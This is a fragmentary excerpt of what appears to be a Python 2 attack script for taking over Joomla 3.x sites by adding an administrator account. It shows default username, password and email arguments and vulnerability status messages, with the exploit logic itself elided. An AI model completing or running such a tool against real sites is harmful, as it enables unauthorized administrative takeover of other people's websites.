...
def parse_options():
	...
	parser.add_argument('-u', '--username', default='rai')
	parser.add_argument('-p', '--password', default='admin')
	parser.add_argument('-e', '--email', default='raic0d3r@gmail.com')
...
def pwn_joomla(options):
	try:
		...
		if not can_login:
			...
			print c + '       [' + y + '+' + c + '] ' + y + 'Joomla 3x Add admin' + g + ' [Vuln!!]'
			...
			print options.url + ' --> Joomla TakeAdmin Not Vuln!'
